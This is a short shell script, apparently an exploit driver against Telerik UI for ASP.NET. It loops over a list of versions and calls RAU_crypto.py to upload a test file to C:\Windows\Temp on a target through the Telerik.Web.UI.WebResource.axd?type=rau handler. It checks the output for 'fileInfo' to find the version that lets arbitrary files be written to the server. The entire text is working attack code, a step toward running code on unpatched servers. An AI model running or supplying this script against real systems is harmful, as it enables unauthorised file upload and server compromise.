echo 'test' > testfile.txt
for VERSION in $(cat versions.txt); do
            echo -n "$VERSION: "
                python3 RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt <HOST>/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo
        done